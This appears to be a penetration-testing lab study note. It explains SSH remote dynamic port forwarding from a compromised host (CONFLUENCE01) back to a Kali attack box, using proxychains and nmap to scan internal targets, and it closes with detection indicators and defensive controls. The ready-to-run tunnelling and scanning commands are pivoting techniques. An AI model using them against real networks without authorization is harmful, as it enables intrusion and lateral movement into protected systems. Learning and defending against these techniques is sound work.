## Overview

SSH remote dynamic port forwarding creates a SOCKS proxy on the SSH server.

Traffic sent to that SOCKS proxy is:

1. accepted by the SSH server,
    
2. carried backward through the SSH tunnel,
    
3. received by the SSH client,
    
4. forwarded by the SSH client to whichever destination the SOCKS-aware tool requested.
    

General syntax:

```bash
ssh -N -R <remote_socks_port> <ssh_user>@<ssh_server_ip>
```

Example:

```bash
ssh -N -R 9998 kali@192.168.118.4
```

The most important rule is:

```text
The SOCKS listener is created on the SSH server.

The final destination connections are made from the SSH client.
```

Remote dynamic forwarding is useful when:

```text
inbound access to the compromised network is blocked
but
the compromised host can SSH outbound to an attacker-controlled server
```

It combines:

```text
remote port forwarding
+
dynamic SOCKS proxying
```

---

# Why This Is Useful

Classic remote port forwarding maps one remote listener to one destination.

Example:

```bash
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```

This gives access only to:

```text
10.4.50.215:5432
```

Remote dynamic forwarding creates one SOCKS proxy that can reach many destinations from the compromised host’s point of view.

Example:

```bash
ssh -N -R 9998 kali@192.168.118.4
```

This can reach different targets such as:

```text
10.4.50.64:80
10.4.50.64:3389
10.4.50.215:5432
172.16.50.217:445
```

as long as the compromised SSH client can route to them.

---

# Core Mental Model

```text
Tool on Kali
↓
Proxychains sends SOCKS traffic to Kali's SOCKS listener
↓
Kali SSH server
↓
SSH tunnel back to compromised host
↓
Compromised SSH client
↓
Requested internal destination
```

The destination is not specified in the SSH command.

The tool using the SOCKS proxy specifies the destination dynamically.

# Understand Each IP Address

For this command:

```bash
ssh -N -R 9998 kali@192.168.118.4
```

## `9998`

This is the SOCKS proxy port created on the SSH server.

Because no bind IP is specified, OpenSSH binds it to the SSH server’s loopback interface by default.

On Kali, it appears as:

```text
127.0.0.1:9998
```

and often also:

```text
[::1]:9998
```

---

## `kali`

This is the SSH user on the SSH server.

The compromised host authenticates to Kali as this user.

---

## `192.168.118.4`

This is the SSH server IP.

In this scenario, it is the attack host:

```text
Kali
```

CONFLUENCE01 connects outbound to:

```text
192.168.118.4:22
```

---

## `10.4.50.64`

This is an internal target.

It does not appear in the SSH command.

It appears in proxied tool commands, such as:

```bash
proxychains nmap -sT -Pn -n 10.4.50.64
```

Proxychains tells the SOCKS proxy:

```text
Connect to 10.4.50.64 on the port requested by the tool.
```

The SSH client on CONFLUENCE01 then makes that final connection.

---

# SSH Client, SSH Server, and Final Target

## SSH Client

The SSH client is the machine running the `ssh -R` command.

Here:

```text
CONFLUENCE01
192.168.50.63
```

It initiates the outbound SSH connection.

It makes the final connections to internal targets.

---

## SSH Server

The SSH server is the host after `user@`.

Here:

```text
Kali
192.168.118.4
```

It receives the SSH connection.

It owns the SOCKS listener.

---

## SOCKS Listener

The SOCKS listener is created on the SSH server.

Here:

```text
127.0.0.1:9998 on Kali
```

Proxychains points to this listener.

---

## Final Target

The final target is chosen dynamically by the SOCKS-aware tool.

Examples:

```text
10.4.50.64:80
10.4.50.64:135
10.4.50.64:3389
```

The final target must be reachable from the SSH client:

```text
CONFLUENCE01
```

---

# Why `-R 9998` Creates SOCKS

Classic remote forwarding uses two socket pairs:

```bash
ssh -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```

Remote dynamic forwarding uses only a remote listening port:

```bash
ssh -R 9998 kali@192.168.118.4
```

Because no fixed destination is provided, OpenSSH treats this as a remote dynamic forward and creates a SOCKS proxy on the remote side.

> [!important]  
> Remote dynamic forwarding requires OpenSSH client version `7.6` or newer. The SSH server version is less important for this feature.

# 1. Confirm the Compromised Host Can SSH Out

From CONFLUENCE01:

```bash
nc -nvz 192.168.118.4 22
```

or:

```bash
ssh kali@192.168.118.4
```

The outbound SSH connection must be permitted.

# 2. Start SSH Server on Kali

On Kali:

```bash
sudo systemctl start ssh
```

Verify:

```bash
sudo ss -lntp | grep ':22'
```

Expected:

```text
0.0.0.0:22
[::]:22
```

# 3. Ensure Authentication Works

If password authentication is required, check:

```text
/etc/ssh/sshd_config
```

Relevant setting:

```text
PasswordAuthentication yes
```

Restart SSH if changed:

```bash
sudo systemctl restart ssh
```

> [!warning]  
> Use a strong, unique password when allowing SSH access to the attack host.

---

# 4. Create the Remote Dynamic Forward

Run on CONFLUENCE01:

```bash
ssh -N -R 9998 kali@192.168.118.4
```

Command breakdown:

|Component|Meaning|
|---|---|
|`ssh`|Start OpenSSH client|
|`-N`|Do not open a remote shell|
|`-R 9998`|Create a remote SOCKS proxy on Kali port `9998`|
|`kali`|SSH user on Kali|
|`192.168.118.4`|Kali SSH server IP|

After authentication, no shell prompt appears.

This is expected because:

```text
-N prevents remote command execution.
```

---

# 5. Verify the SOCKS Listener on Kali

On Kali:

```bash
ss -lntp | grep 9998
```

Expected:

```text
127.0.0.1:9998
```

Example:

```text
tcp LISTEN 0 128 127.0.0.1:9998 0.0.0.0:* users:(("sshd",pid=939038,fd=9))
```

This confirms:

```text
Kali is listening locally on port 9998.
```

---

# 6. Configure Proxychains on Kali

Edit:

```bash
sudo nano /etc/proxychains4.conf
```

Set the proxy list:

```text
[ProxyList]
socks5 127.0.0.1 9998
```

Meaning:

|Value|Role|
|---|---|
|`socks5`|SOCKS proxy protocol|
|`127.0.0.1`|Kali loopback|
|`9998`|Remote dynamic SOCKS port|

> [!important]  
> With remote dynamic forwarding, Proxychains usually points to `127.0.0.1` because the SOCKS proxy is bound on Kali itself.

---

# 7. Use the Internal Target IP in Tool Commands

Run tools as though Kali can directly reach the internal host.

Example:

```bash
proxychains nmap -sT -Pn -n 10.4.50.64
```

Do not use:

```text
127.0.0.1
```

as the target unless the final service is actually on Kali.

`127.0.0.1:9998` is only the SOCKS proxy.

The tool target remains:

```text
10.4.50.64
```

# 8. Nmap Through Remote Dynamic SOCKS

Recommended scan:

```bash
proxychains nmap -sT -Pn -n --top-ports 20 10.4.50.64
```

Command breakdown:

|Option|Meaning|
|---|---|
|`proxychains`|Sends connections through the SOCKS proxy|
|`nmap`|Port scanner|
|`-sT`|TCP connect scan|
|`-Pn`|Skip host discovery|
|`-n`|Disable DNS lookups|
|`--top-ports 20`|Scan top 20 common ports|
|`10.4.50.64`|Internal target|

Traffic flow:

```text
Nmap on Kali
↓
Proxychains
↓
127.0.0.1:9998
↓
SSH tunnel
↓
CONFLUENCE01
↓
10.4.50.64:<scanned_port>
```

---

# Why `-sT`, `-Pn`, and `-n` Matter

## `-sT`

Proxychains works best with normal TCP connection calls.

Use:

```bash
-sT
```

Avoid SYN scans:

```bash
-sS
```

because raw packets do not proxy cleanly through SOCKS.

---

## `-Pn`

Host discovery may use probes that do not work through SOCKS.

Use:

```bash
-Pn
```

This tells Nmap to treat the host as up and scan ports directly.

---

## `-n`

DNS resolution may not follow the proxy route.

Use:

```bash
-n
```

This avoids DNS delays and leaks.

# Proxychains Output

Example:

```text
Strict chain ... 127.0.0.1:9998 ... 10.4.50.64:135 ... OK
```

Interpretation:

```text
Proxychains connected to SOCKS proxy:
127.0.0.1:9998

The SOCKS proxy requested:
10.4.50.64:135

```

Failure example:

```text
Strict chain ... 127.0.0.1:9998 ... 10.4.50.64:22 <-- socket error or timeout
```

Interpretation:

```text
The SOCKS proxy was reachable, but the target port did not connect successfully.
```

# Binding Options

## Default Loopback Binding

```bash
ssh -N -R 9998 kali@192.168.118.4
```

Creates listener on Kali:

```text
127.0.0.1:9998
```

This is usually preferred because only local tools on Kali can use the proxy.

---

## External Binding

To request an externally reachable SOCKS listener:

```bash
ssh -N -R 0.0.0.0:9998 kali@192.168.118.4
```

The Kali SSH server must allow this through:

```text
GatewayPorts
```

Recommended server setting if needed:

```text
GatewayPorts clientspecified
```

Restart SSH after changing:

```bash
sudo systemctl restart ssh
```

> [!warning]  
> Exposing a SOCKS proxy externally can allow other hosts to route traffic through the compromised host.

# Troubleshooting

## No Output After SSH Authentication

This is normal with:

```text
-N
```

Verify on Kali:

```bash
ss -lntp | grep 9998
```

---

## SOCKS Listener Does Not Appear on Kali

Use verbose mode:

```bash
ssh -vvv -N -R 9998 kali@192.168.118.4
```

Possible causes:

```text
OpenSSH client is older than 7.6
remote port already in use
AllowTcpForwarding disabled
authentication failed
SSH session dropped
```

Check Kali SSH server setting:

```text
AllowTcpForwarding yes
```

---

## Proxychains Cannot Connect to SOCKS Proxy

Check:

```text
SOCKS listener exists on Kali
Proxychains points to 127.0.0.1
Proxychains uses the correct port
SSH tunnel is still active
```

Verify:

```bash
ss -lntp | grep 9998
```

---

## Proxy Works but Target Does Not Respond

The final target must be reachable from the SSH client.

Test from CONFLUENCE01 where possible:

```bash
nc -zv <target_ip> <target_port>
```

Possible causes:

```text
wrong target IP
wrong port
host firewall
network route missing
service not listening
```

---

## Nmap Results Are Slow or Inaccurate

Use:

```bash
-sT
-Pn
-n
```

Avoid:

```bash
-sS
```

through Proxychains.

Reduce scanned ports first:

```bash
proxychains nmap -sT -Pn -n -p 80,135,3389 10.4.50.64
```

---

## Tool Ignores Proxychains

Proxychains may fail with:

```text
statically linked binaries
raw socket tools
custom networking stacks
UDP-only tools
some Go binaries
setuid binaries
```

Use another tool or create a fixed remote port forward.

---

## External SOCKS Binding Fails

If using:

```bash
-R 0.0.0.0:9998
```

check:

```text
GatewayPorts clientspecified
```

on the SSH server.

Loopback binding does not require external exposure and is usually safer.

# Remote Dynamic Forwarding Decision Guide

Use remote forwarding when:

```text
You need one internal host and port
Inbound access is blocked
The compromised host can SSH out
```

Use remote dynamic forwarding when:

```text
You need many internal hosts or ports
Inbound access is blocked
The compromised host can SSH out
You can run Proxychains or SOCKS-aware tools on the attack host
```

Use local dynamic forwarding when:

```text
You can place the SOCKS listener somewhere your tools can reach
The SSH client can be reached from your attack host
```

---

# Security and Detection Notes

Potential indicators include:

```text
outbound SSH from compromised host
long-lived SSH session to attacker infrastructure
sshd process listening on local SOCKS port
proxychains-style scanning patterns
many internal connections sourced from the compromised host
ssh command using -R with a single port
```

Defensive controls include:

```text
restrict outbound SSH
disable unnecessary TCP forwarding
monitor AllowTcpForwarding usage
monitor long-lived SSH sessions
detect SOCKS-like traffic through SSH
restrict egress from application servers
```

---

# Key Takeaways

- Remote dynamic forwarding creates a SOCKS proxy on the SSH server.
    
- The SSH command runs on the compromised SSH client.
    
- The compromised host initiates the outbound SSH connection.
    
- The compromised host makes final connections to internal targets.
    
- The attack host usually accesses the SOCKS proxy on `127.0.0.1:<port>`.
    
- Proxychains points to the SOCKS listener on the attack host.
    
- Tool commands use the real internal target IPs.
    
- `-R <port>` with no destination creates a remote dynamic SOCKS proxy.
    
- OpenSSH client version `7.6` or newer is required.
    
- Use `-sT`, `-Pn`, and `-n` when scanning with Nmap through SOCKS.
    
- Remote dynamic forwarding is useful when inbound access is blocked but outbound SSH is allowed.
    
- Authentication to the SSH server and authentication to internal services are separate.
